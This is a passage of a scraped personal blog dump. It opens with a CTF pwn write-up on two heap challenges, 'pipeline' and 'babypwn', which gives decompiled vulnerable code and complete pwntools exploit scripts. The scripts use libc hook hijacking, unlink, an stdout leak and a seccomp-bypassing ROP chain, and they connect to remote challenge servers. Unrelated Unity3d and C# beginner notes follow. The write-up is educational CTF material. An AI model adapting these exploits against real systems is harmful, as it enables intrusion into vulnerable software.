print(&quot;index: &quot;);  result = (_QWORD *)get_buf(index);  buf = result;  if ( result )  &#123;    result = (_QWORD *)*result;    if ( *buf )    &#123;      v3 = print(&quot;size: &quot;);      printf(&quot;data: &quot;);      size = *((_DWORD *)buf + 3) - *((_DWORD *)buf + 2);// size - offset      if ( v3 &lt;= size )        LOWORD(size) = v3;                      // vul      result = (_QWORD *)readn(*buf + *((int *)buf + 2), size);    &#125;  &#125;  return result;&#125;\n\n一个整性溢出，因为采用LOWORD(size) = v3; 进行赋值的，当我输入负数绕过判断，若LOWORD(v3)中的值为大于size本身值，即可实现溢出，那么就很好利用了。实现了任意地址写入，但有个检查\nunsigned __int64 __fastcall check_error(unsigned __int64 ptr)&#123;  unsigned __int64 result; // rax  if ( ptr &lt; *(_QWORD *)check_mem_buf    || (result = *(_QWORD *)check_mem_buf + *(_QWORD *)(check_mem_buf + 8), ptr &gt;= result) )  &#123;    puts(&quot;error&quot;);    exit(0);  &#125;  return result;&#125;\n\n而check_mem_buf的值在初始化的时候赋予了\nunsigned int init_()&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  check_mem_buf = (__int64)malloc(0x10uLL);  *(_QWORD *)check_mem_buf = check_mem_buf + 16;  *(_QWORD *)(check_mem_buf + 8) = 0x21000LL;   // memsize  return alarm(0x78u);&#125;\n\n基本上我们只能在堆段中实现任意地址写入了，这也比较好绕过，每个编辑功能都有个head chunk，修改head中的body指针，就可以实现任意地址写入数据了。\n修改__realloc_hook为system，再调用realloc函数即可调用system。\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;pipeline&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;# remote server ip and porthost = &quot;59.110.173.239:2399&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def ad():    sla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)def md(idx, of, sz):    sla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(idx))    sla(&#x27;:&#x27;, str(of))    sla(&#x27;:&#x27;, str(sz))def rm(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)    sla(&#x27;:&#x27;, str(idx))def ap(idx, sz, d):    sla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)    sla(&#x27;:&#x27;, str(idx))    sla(&#x27;:&#x27;, str(sz))    sa(&#x27;:&#x27;, d)def dp(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;5&#x27;)    sla(&#x27;:&#x27;, str(idx))#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    # leak libc    ad()    md(0, 0, 0x458)    ad()    md(0, 0, 0) # free    md(0, 0, 0x458) # add    dp(0)    leak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)    libc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 96 - 0x10    li(&#x27;libc_base: &#x27; + hex(libc_base))    # leak heap    md(0, 0, 0) # free    md(0, 0, 0x18) # add    md(1, 0, 0x18) # add    #ap(0, -1, &#x27;A&#x27;)    ap(0, 0x18, b&#x27;A&#x27; * 0x10 + p64(0x1234))    md(0, 0, 0)  # free    md(1, 0, 0)  # free    md(0, 0, 0x18)  # add    dp(0)    ru(&#x27;data: &#x27;)    leak = u64(ru(&#x27;\\n&#x27;).ljust(8, b&#x27;\\x00&#x27;))    heap = leak    li(&#x27;heap: &#x27; + hex(heap))    ad()    md(1, 0x18, 0)  # add 1    md(2, 0x18, 0)  # add 2    ad()    md(3, 0x18, 0)  # add 3    md(2, 0, 0)  # free 2    md(3, 0, 0)  # free 3    md(1, 0, 0)  # free 1    li(&#x27;target_chunk: &#x27; + hex(heap + 0x460))    p = b&#x27;\\x00&#x27; * 0x18    p += p64(0x21) + p64(heap + 0x460) + p64(0)    p += b&#x27;\\n&#x27;    ap(0, -0x7ffff00, p)    md(3, 0, 0x18)  # add 3    md(2, 0, 0x18)  # add 2    p = p64(libc_base + libc.sym[&#x27;__realloc_hook&#x27;]) + p64(0x0000001800000000)    p += b&#x27;\\n&#x27;    ap(2, 0x18, p)        ap(1, 0x18, p64(libc_base + libc.sym[&#x27;system&#x27;]) + b&#x27;\\n&#x27;)    ap(0, 0x18, &#x27;/bin/sh\\x00\\n&#x27;)    md(0, 0, 0)  # free , to get shell    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\n\n\nbabypwn这个题也是个坑，打印函数采用加密\nint __fastcall enc_print(unsigned int a1)&#123;  int i; // [rsp+1Ch] [rbp-4h]  for ( i = 2; i &gt; 0; --i )    a1 ^= (32 * a1) ^ ((a1 ^ (32 * a1)) &gt;&gt; 17) ^ (((32 * a1) ^ a1 ^ ((a1 ^ (32 * a1)) &gt;&gt; 17)) &lt;&lt; 13);  return printf(&quot;%lx\\n&quot;, a1);&#125;\n\n采用z3库来解，只能解一次循环加密的，第二次循环的解不出来，只能不用该条件了。\n漏洞点\nunsigned __int64 __fastcall chc(_BYTE *a1)&#123;  unsigned __int64 ch_; // rax  while ( 1 )  &#123;    ch_ = (unsigned __int8)*a1;    if ( !(_BYTE)ch_ )      break;    if ( *a1 == &#x27;\\x11&#x27; )                        // vul    &#123;      ch_ = (unsigned __int64)a1;      *a1 = 0;      return ch_;    &#125;    ++a1;  &#125;  return ch_;&#125;\n\n在输入完数据后，会死循环读取数据，若出现’\\x00’则跳出，若出现’\\x11’修改该字节为’\\x00’且跳出循环。这利用方式就跟off by one差不多了。\n程序开了沙箱\n__int64 sub_BAA()&#123;  __int64 v1; // [rsp+8h] [rbp-8h]  v1 = seccomp_init(2147418112LL);  seccomp_rule_add(v1, 0LL, 59LL, 0LL);  return seccomp_load(v1);&#125;\n\n前期我以为程序是在2.31下的利用方式，我一直在glibc 为2.31的环境下调试，怎么都不好构造绕过prev_size &#x3D;&#x3D; chunk_size这个检查，查看libc.so.6，发现为2.27的。。。\n那就很方便的采用unlink构造堆重叠，由于没有办法解密上面那个泄漏的数据，只能partial write打到_IO_2_1_stdout泄漏libc，打通几率1 &#x2F; 16，\n泄漏之后，然后劫持__free_hook为setcontext + 53处的gadget实现堆栈迁移值 __free_hook - 0x108处，这里我是放在__free_hook高地址位置的，本地能打通，远程死活打不通，我只调用write函数能够泄漏地址信息，应该是某些部分数据被覆盖，导致我的rop链破坏了，只能将rop放在__free_hook上面。  \nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;./babypwn&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;39.105.130.158:8888&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def ad(sz):    sla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)    sla(&#x27;:&#x27;, str(sz))def rm(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(idx))def md(idx, d):    sla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)    sla(&#x27;:&#x27;, str(idx))    sa(&#x27;:&#x27;, d)def dp(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)    sla(&#x27;:&#x27;, str(idx))#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    ad(0x108) # 0    ad(0x128) # 1    ad(0x118) # 2    ad(0x108) # 3    for i in range(7):        ad(0x100)    for i in range(4, 11):        rm(i)    for i in range(7):        ad(0xf0)    for i in range(4, 11):        rm(i)    rm(0) # set libc    md(2, &#x27;A&#x27; * 0x118) # set last one    md(2, b&#x27;A&#x27; * 0x110 + p64(0x120 + 0x130 + 0x110))    md(3, b&#x27;A&#x27; * 0xf8 + p64(0x121)) # set fake size    rm(3) # unlink    ad(0x108) # 0    ad(0x108) # 3    ad(0x108) # 4    ad(0x108) # 5    ad(0x108) # 7    ad(0x108) # 8    ad(0x108) # 9    rm(2) # remove chunk1    ad(0xd0) # 2    ad(0x150) # 9    ad(0x130) # 10    #2760    md(10, &#x27;\\x50\\x97&#x27;) # set to stdout    ad(0x118) # 11    ad(0x118) # 12    p = b&#x27;A&#x27; * 0x10    p += p64(0xfbad3c80) + p64(0) * 3 + p8(0)    md(12, p)    leak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)    libc_base = leak - (0x7ffff7b8a8b0 - 0x7ffff779d000)    li(&#x27;libc_base: &#x27; + hex(libc_base))    rm(11)    md(10, p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] - 0x110))    ad(0x130) # 11    ad(0x130) # 13    libc_open = libc_base + libc.sym[&#x27;open&#x27;]    libc_read = libc_base + libc.sym[&#x27;read&#x27;]    libc_write = libc_base + libc.sym[&#x27;write&#x27;]    pop_rdx_rsi = libc_base + 0x00000000001306d9 # pop rdx ; pop rsi ; ret    pop_rdi = libc_base + 0x000000000002155f # pop rdi ; ret    ret = libc_base + 0x00000000000008aa # ret    pop_rax = libc_base + 0x00000000000439c8 # pop rax ; ret    syscall = libc_base + 0x11007f    &#x27;&#x27;&#x27;    p = p64(libc_base + 0x520a5) # setcontext    p += p64(pop_rdi) + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] + 0x120)    p += p64(pop_rdx_rsi) + p64(0) + p64(0)    p += p64(libc_open)    p += p64(pop_rdi) + p64(3)    p += p64(pop_rdx_rsi) + p64(0x100) + p64(libc_base + libc.sym[&#x27;__malloc_hook&#x27;])    p += p64(libc_read)    p += p64(pop_rdi) + p64(1)    p += p64(libc_write)    p = p.ljust(0x120, b&#x27;\\x00&#x27;)    p += b&#x27;./flag&#x27;    &#x27;&#x27;&#x27;    p = p64(pop_rdi) + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] - 0x10) # flag    p += p64(pop_rdx_rsi) + p64(0) + p64(0)    p += p64(pop_rax) + p64(2)    p += p64(syscall)    p += p64(pop_rdi) + p64(3)    p += p64(pop_rdx_rsi) + p64(0x100) + p64(libc_base + libc.sym[&#x27;__malloc_hook&#x27;])    p += p64(pop_rax) + p64(0)    p += p64(syscall)    p += p64(pop_rdi) + p64(1)    p += p64(pop_rax) + p64(1)    p += p64(syscall)    p = p.ljust(0x100, b&#x27;\\x00&#x27;)    p += b&#x27;./flag.txt\\x00&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    p += p64(libc_base + 0x520a5) # setcontext    md(13, p) # modify free_hook    p = b&#x27;A&#x27; * 0xa0    p += p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] - 0x110) # rsp    p += p64(ret) # rcx    md(11, p)    db()    rm(11)        def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        #io = elf.process()        io = process(elf_path, env = &#123;&#x27;LD_PREALOAD&#x27;: libc_path&#125;)    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"Unity3d 基础学习","url":"/2021/06/21/dev/game/u3d/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/","content":"Unity3d 基础学习注: 本片文章记录自己遇到的一些问题，还有学习记录。\ndoc: https://docs.unity3d.com/Manual/\nasset store: https://assetstore.unity.com/\n如何使用Unity3d构建一个Android程序安装好引擎之后，确保有Android Sdk，这个直接从UnityHub中下载即可，创建一个项目，随便拖拖场景，选择File-&gt;Build Settings-&gt; Android -&gt; Switch-&gt; Build。点击Build后，选择一个路径保存即可。编译完毕后，可以看到选择的文件夹下出现一个apk文件。\n如何修改启动场景File-&gt;Build Settings -&gt; Scenes In Build\n选择你的场景即可。\n如何打印日志Debug.Log(&quot;My name is &quot; + &quot;i0gan&quot;);   \n\n\n\n\n\n如何修改Transform组件属性transform.position = new Vector3(x, 0, 0);\n\n\n\n\n\nButton点击事件using System.Collections;using System.Collections.Generic;using UnityEngine;using UnityEngine.UI;public class Click_Settings : MonoBehaviour&#123;    void Awake () &#123;        Button button = gameObject.GetComponent&lt;Button&gt;() as Button;// 获取Button组件        button.onClick.AddListener(ClickedSettings);// 为button的OnClick事件添加监听器，当监听到Click事件时，回调ClickedSettings函数。    &#125;    // Start is called before the first frame update    void Start()    &#123;            &#125;    void ClickedSettings() &#123;        Debug.Log(&quot;Hello world&quot;);    &#125;    // Update is called once per frame    void Update()    &#123;            &#125;&#125;\n\n\n\n\n\n跨脚本调用GameObject go = GameObject.Find(“somegameobjectname”);ScriptB other = (ScriptB) go.GetComponent(typeof(ScriptB));other.DoSomething();\n\nref: https://www.pianshen.com/article/5019397567/\nref: https://www.jianshu.com/p/b0d5504a12a4\n键盘按下ref: https://www.cnblogs.com/1138720556Gary/p/9652350.html\nvoid Update()    &#123;        if(Input.GetKey(KeyCode.UpArrow))        &#123;            Vector3 newPos = transform.position;            newPos.y += speed;            transform.position = newPos;        &#125;        else if (Input.GetKey(KeyCode.DownArrow))        &#123;            Vector3 newPos = transform.position;            newPos.y -= speed;            transform.position = newPos;        &#125;        else if (Input.GetKey(KeyCode.LeftArrow))        &#123;            Vector3 newPos = transform.position;            newPos.x -= speed;            transform.position = newPos;        &#125;        else if (Input.GetKey(KeyCode.RightArrow))        &#123;            Vector3 newPos = transform.position;            newPos.x += speed;            transform.position = newPos;        &#125;    &#125;\n\n\n\n\n\n\n\n设置横屏File-&gt;Player Settings -&gt; Player -&gt; Settings for Android -&gt; Resolution and Presentation -&gt; Default Orientation\n或者\nEdit-&gt;Project Settings -&gt; Settings for Android -&gt; Resolution and Presentation -&gt; Default Orientation\nref: https://blog.csdn.net/Wenhao_China/article/details/110328045\n使UI跟随屏幕分辨率变化自适应设置Canvas对象的Canvas Scaler -&gt;UI Scale Mode为Scale With Screen Size\nhttps://blog.csdn.net/qq_15020543/article/details/82595179\n切换场景using System.Collections;using System.Collections.Generic;using UnityEngine;using UnityEngine.SceneManagement;//首先要记得引用命名空间public class ChangeSceneTest : MonoBehaviour&#123;    //在unity中 File-&gt;Build Settings-&gt;把要切换的场景添加到Scenes In Build下面，也可以Add Open Scenes    //把该脚本的方法添加到场景中切换场景按钮上面的Button-&gt;OnClick   public void OnClick()    &#123;        SceneManager.LoadScene(&quot;SceneName&quot;);//要切换到的场景名    &#125;&#125;\n\n\n\n\n\n\n\n播放视频ref: https://blog.csdn.net/yangwenjie16/article/details/80746699\n如何实现控制脚本创建一个空对象，在此空对象上挂在脚本，若想控制其他对象，在脚本中创建所要控制对象的变量，在可视化视图中拖进该变量中。\n如:\npublic InputField textInput;\n\n定义好之后，可视化界面赋值即可。\n如何通过Button按钮触发脚本的函数在某脚本中定义好函数后，在Button的可视化界面，在Button-&gt;Click下添加一个对象，在视图中选择所要触发的函数即可。\n设置后台运行Settings for PC, Mac &amp; Linux Standalone -&gt; Run In Background\n没有声音There are no audio listeners in the scene. Please ensure there is always one audio listener in the scene\n\n解决\n添加一个audio listener组件在Camara里\nref: https://forum.unity.com/threads/there-are-no-audio-listeners-in-the-scene-thats-actually-fine-right.384596/\n如何停顿5秒执行一个方法nvoke方法可以制定一个函数延迟调用。\nvoid  TestFunc &#123;     Debug.Log( &quot;Test&quot; );&#125;\n\n5秒调用上面的TestFunc函数，可以这样\nInvoke( &quot;TestFunc&quot; , 5f);\n\n\n\n每隔几秒重复执行一段代码void Start () &#123;　　StartCoroutine(&quot;DoSomething&quot;);&#125;\n\n\n\nIEnumerator DoSomething () &#123;　　while (true) &#123;　　\t//需要重复执行的代码就放于在此处　　\tprint(&quot;DoSomething Loop&quot;);　　\tyield return new  WaitForSeconds (1);　　&#125;&#125;\n\nref: https://blog.csdn.net/yf391005/article/details/94732900?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-2.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-2.nonecase\n资源获取https://blog.csdn.net/weixin_41814169/article/details/88181762\nhttps://github.com/764424567/Unity-plugin\n加载场景using System.Collections;using System.Collections.Generic;using UnityEngine;using UnityEngine.SceneManagement;public class ClickBack : MonoBehaviour ｛    public void Click_Back() ｛        StartCoroutine(Load());    ｝    IEnumerator Load()    ｛        AsyncOperation op = SceneManager.LoadSceneAsync(&quot;index&quot;);        yield return new WaitForEndOfFrame();        op.allowSceneActivation = true;    ｝｝\n\n\n\nref: https://gameinstitute.qq.com/community/detail/129045\n退出游戏using System.Collections;using System.Collections.Generic;using UnityEngine;public class QuitScene : MonoBehaviour &#123;        void Update () &#123;        if (Input.GetKeyDown(KeyCode.Escape))&#123;//按下ESC键则退出游戏#if UNITY_EDITOR            UnityEditor.EditorApplication.isPlaying = false;#else        Application.Quit();#endif        &#125;    &#125;&#125;\n\nref: https://blog.csdn.net/qq_39225721/article/details/90599047\n设置图片全屏https://www.tqwba.com/x_d/jishu/143511.html\nUnity调用摄像头获取拍摄画面 1ref: https://blog.csdn.net/sinat_34791632/article/details/78261893\ncode\nusing System.Collections;using UnityEngine;public class Test : MonoBehaviour&#123;    public WebCamTexture cameraTexture;    public string cameraName = &quot;&quot;;    private string isUser;    private MeshRenderer renderer;    void Start()    &#123;        renderer = this.GetComponent&lt;MeshRenderer&gt;();        StartCoroutine(Test1());    &#125;    IEnumerator Test1()    &#123;        yield return Application.RequestUserAuthorization(UserAuthorization.WebCam);        bool isUser = Application.HasUserAuthorization(UserAuthorization.WebCam);        isUser = false;        if (!isUser)        &#123;            WebCamDevice[] devices = WebCamTexture.devices;            cameraName = devices[0].name;            cameraTexture = new WebCamTexture(cameraName, 1024, 768,30);            cameraTexture.Play();            renderer.material.mainTexture = cameraTexture;        &#125;    &#125;&#125;\n\n\n\n\n\nUnity调用摄像头获取拍摄画面 2获取设备信息ref: https://blog.csdn.net/weixin_34162629/article/details/93687008\nusing UnityEngine;  using System.Collections;  public class GetSystemInfo : MonoBehaviour &#123;        string systemInfo;      // Use this for initialization      void Start() &#123;          systemInfo = &quot;\\tTitle:当前系统基础信息：\\n设备模型：&quot; + SystemInfo.deviceModel + &quot;\\n设备名称：&quot; + SystemInfo.deviceName + &quot;\\n设备类型：&quot; + SystemInfo.deviceType +              &quot;\\n设备唯一标识符：&quot; + SystemInfo.deviceUniqueIdentifier + &quot;\\n显卡标识符：&quot; + SystemInfo.graphicsDeviceID +              &quot;\\n显卡设备名称：&quot; + SystemInfo.graphicsDeviceName + &quot;\\n显卡厂商：&quot; + SystemInfo.graphicsDeviceVendor +              &quot;\\n显卡厂商ID:&quot; + SystemInfo.graphicsDeviceVendorID + &quot;\\n显卡支持版本:&quot; + SystemInfo.graphicsDeviceVersion +              &quot;\\n显存（M）：&quot; + SystemInfo.graphicsMemorySize + &quot;\\n显卡像素填充率(百万像素/秒)，-1未知填充率：&quot; + SystemInfo.graphicsPixelFillrate +              &quot;\\n显卡支持Shader层级：&quot; + SystemInfo.graphicsShaderLevel + &quot;\\n支持最大图片尺寸：&quot; + SystemInfo.maxTextureSize +              &quot;\\nnpotSupport：&quot; + SystemInfo.npotSupport + &quot;\\n操作系统：&quot; + SystemInfo.operatingSystem +              &quot;\\nCPU处理核数：&quot; + SystemInfo.processorCount + &quot;\\nCPU类型：&quot; + SystemInfo.processorType +              &quot;\\nsupportedRenderTargetCount：&quot; + SystemInfo.supportedRenderTargetCount + &quot;\\nsupports3DTextures：&quot; + SystemInfo.supports3DTextures +              &quot;\\nsupportsAccelerometer：&quot; + SystemInfo.supportsAccelerometer + &quot;\\nsupportsComputeShaders：&quot; + SystemInfo.supportsComputeShaders +              &quot;\\nsupportsGyroscope：&quot; + SystemInfo.supportsGyroscope + &quot;\\nsupportsImageEffects：&quot; + SystemInfo.supportsImageEffects +              &quot;\\nsupportsInstancing：&quot; + SystemInfo.supportsInstancing + &quot;\\nsupportsLocationService：&quot; + SystemInfo.supportsLocationService +              &quot;\\nsupportsRenderTextures：&quot; + SystemInfo.supportsRenderTextures + &quot;\\nsupportsRenderToCubemap：&quot; + SystemInfo.supportsRenderToCubemap +              &quot;\\nsupportsShadows：&quot; + SystemInfo.supportsShadows + &quot;\\nsupportsSparseTextures：&quot; + SystemInfo.supportsSparseTextures +              &quot;\\nsupportsStencil：&quot; + SystemInfo.supportsStencil + &quot;\\nsupportsVertexPrograms：&quot; + SystemInfo.supportsVertexPrograms +              &quot;\\nsupportsVibration：&quot; + SystemInfo.supportsVibration + &quot;\\n内存大小：&quot; + SystemInfo.systemMemorySize;        &#125;        // Update is called once per frame      void OnGUI() &#123;          GUILayout.Label(systemInfo);      &#125;  &#125;\n\n\n\n\n\n处理json [LitJson]ref: https://www.cnblogs.com/gss0525/p/10209715.html\nref: https://litjson.net/docs/quickstart/mapping-json-to-objects\ndownload: https://github.com/LitJSON/litjson/releases\n下载之后，将src下的LitJson文件复制到Plugins目录下\n例子:\n\n\n\n\n处理json 其他 [NewtonsoftJson]ref: https://blog.csdn.net/youxijishu/article/details/104348151\n本次示例使用的Unity3d版本是2019.3.1f1，NewtonsoftJson的版本tag是8.0.3，它的github地址是：https://github.com/JamesNK/Newtonsoft.Json/tree/8.0.3\n注意，网上很多示例都是导入它的dll文件，这样在unity3d编辑器里面使用是没有问题的，但是如果发布成安卓包就会有异常。所以要把NewtonsoftJson项目中src下面的Newtonsoft.Json中的原文件整个添加到unity3d的Plugins目录下，如图所示：\n随机背景图片生成ref: https://blog.csdn.net/zhang_by0_0/article/details/110800642\n储存数据ref: https://blog.csdn.net/yeluo_vinager/article/details/50074461\nSendMessageref: https://blog.csdn.net/weixin_38109688/article/details/78420875\nUnity 从Resources中动态加载Sprite图片ref: https://blog.csdn.net/wks310/article/details/86061768\nref: https://blog.csdn.net/u013509878/article/details/80060108\nOnMouseEnterref: https://blog.csdn.net/qq_33781669/article/details/88123611\nUnity中GUITexture过时，guiTexture.texture将GUITexture替换为RawImage即可\nref: https://www.zhihu.com/question/401983080\nParticleEmitter旧粒子系统退役 2018新粒子系统ParticleEmitter -&gt; ParticleSystem\nparticleEmitter.emit -&gt; gameObject.GetComponent().enableEmission\nref: https://blog.csdn.net/qq258456qq/article/details/102569269\nUILabel找不到替换为Text即可(自我发现)。\nThe UILabel class you are looking for is likely part of NGUI.\nImport NGUI into your current project from the asset store (assuming you’ve bought it) and Unity will find the class.\nref: https://stackoverflow.com/questions/19419251/uilabel-could-not-be-found\n安装NGUI插件与使用官网下载: http://tasharen.com/ \nref: https://blog.csdn.net/gtncwy/article/details/37651971\nref: https://www.jianshu.com/p/5d6509506443\nUnityEngine.Mesh’ does not contain a definition for GetTriangleStrip’把GetTriangleStrip改成GetTriangles，对应着SetTriangleStrip也要改成SetTriangles\nref: https://blog.csdn.net/some_man/article/details/76223434\nUnity + Vscode代码补全在vscode安装如下插件\nDebugger for unity\nUnity Tools\nUnity Code Snippets\nUnity Snippets\nref: https://blog.csdn.net/qq_38876313/article/details/107935382\nUnity游戏自更新ref: https://www.cnblogs.com/yfceshi/p/6963923.html\n","categories":["dev"],"tags":["unity3d"]},{"title":"C#之路","url":"/2021/06/20/dev/language/csharp/csharp/","content":"Linux下C# 开发环境搭建doc: https://docs.microsoft.com/zh-cn/dotnet/csharp/\ndoc: https://www.runoob.com/csharp/csharp-tutorial.html\nref: https://wiki.archlinux.org/index.php/Mono\narch\nsudo pacman -S monoyay -S monodevelop-bin # ide\n\n测试\na.cs\nusing System;class MainClass &#123;    public static void Main(string[] args) &#123;        Console.WriteLine(&quot;Hello C#&quot;);    &#125;&#125;\n\n编译运行\nmcs a.csmono a.exe\n\n\n\nsocketsocket_server.cs\nusing System.Net.Sockets;using System.Net;using System;using System.Text;namespace TestSocket&#123;        class Program &#123;                static void Main(String[] args) &#123;                        Socket tcpServer = new Socket (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);                        IPAddress ipaddress = new IPAddress(new byte[]&#123;127,0,0,1&#125;);                        EndPoint point = new IPEndPoint(ipaddress, 8080);                        tcpServer.Bind(point);                        tcpServer.Listen(100); // 参数为最大连接数            Socket clientSocket = tcpServer.Accept(); // 阻塞接收客户端            string msg = &quot;hello&quot;;                byte[] data = Encoding.UTF8.GetBytes(msg);            clientSocket.Send(data);                &#125;        &#125;&#125;\n\n socket_client.cs\nusing System;using System.Collections.Generic;using System.Linq;using System.Net.Sockets;using System.Net;using System.Text;using System.Threading.Tasks;namespace SocketClient &#123;    class Program &#123;        static void Main(string[] args) &#123;            Socket tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);            //建立连接            IPAddress ipaddress = IPAddress.Parse(&quot;127.0.0.1&quot;);            EndPoint point = new IPEndPoint(ipaddress, 8080);            tcpClient.Connect(point);            byte[] data = new byte[1024];            int length = tcpClient.Receive(data);            string msg = Encoding.UTF8.GetString(data, 0, length); //转换字符串            Console.WriteLine(msg);        &#125;            &#125;&#125;\n\n\n\n\n\n处理jsonref: https://www.cnblogs.com/cfas/p/11080203.html\n将一个int转换成一个byte array，又如何将一个byte array转换成一个int至少可以通过三种方法来进行转换。在.NET Framework类库的System名字空间中有个叫做BitConverter的类，它是专门用来进行这种转换的。它有一个GetBytes方法，对于大多数简单的类型来说，该方法都被重载了，它可以返回一个byte array来保存你传递的值。它也有几个ToTypeName方法用来将一个byte array转换成一个基本类型（primitive type）：byte[] b &#x3D; BitConverter.GetBytes(   0xba5eba11 ); &#x2F;&#x2F;{0x11,0xba,0x5e,0xba} uint u &#x3D; BitConverter.ToUInt32(   new byte[] {0xfe, 0x5a, 0x11,   0xfa},0 ); &#x2F;&#x2F; 0xfa115afe在运用BitConverter类时，要记住的一个重点是它的行为取决于硬件架构（代码在该硬件架构上运行）的字节顺序（endianness）——就是 说，integer字节在内存中的存储顺序。如果你将bit保存为可以在许多不同平台上读取的一个文件格式，那么就会出问题。BitConverter有 一个公有的IsLittleEndian字段，你可以查看它是如何运行的，但遗憾的是，你并不能改变它。\n也可以不用BitConverter类，而通过手动位移（bit shifting）来进行转换： b &#x3D; new byte[] {0xfe,0x5a,0x11,0xfa}; u &#x3D; (uint)(b[0] | b[1] &lt;&lt; 8 |   b[2] &lt;&lt; 16 | b[3] &lt;&lt; 24); b[0] &#x3D; (**byte**)(u); b[1] &#x3D; (**byte**)(u &gt;&gt; 8); b[2] &#x3D; (byte)(u &gt;&gt; 16); b[3] &#x3D; (byte)(u &gt;&gt; 24); 用这种方法就可以避免字节顺序问题，因为可以完全控制字节的位置。\n最后——如果不介意用不安全的代码——可以通过直接的内存拷贝来实现转换，把一个指向byte array的指针（pointer）转换成一个指向integer类型的指针，然后取它的值（dereference）：unsafe {   fixed ( byte* pb &#x3D; b )   u &#x3D; ((uint)pb); }\n同BitConverter一样，这个方法的运行结果取决于代码在何种硬件上运行。\n如果要进行很多这种转换——比如说在一个循环中——而且想得到最佳性能，那么建议用最后两种方法中的一种。BitConverter有些慢，尽管区别不大。\nref: https://www.cnblogs.com/zwq194/archive/2013/01/14/2859377.html\n网络字节序问题主机到网络：short&#x2F;int&#x2F;long IPAddress.HostToNetworkOrder(short&#x2F;int&#x2F;long)\n网络到主机：short&#x2F;int&#x2F;long IPAddress.NetworkToHostOrder(short&#x2F;int&#x2F;long) \n思路:\nint x            m = IPAddress.HostToNetworkOrder(x)   BitConverter.GetBytes(m)littel-host       big                                     bytes0x1234            0x3421                                  &#x27;0x12&#x27; &#x27;0x34&#x27;big-host          big                                     bytes0x1234            0x1234                                  &#x27;0x12&#x27; &#x27;0x34&#x27;\n\nref: 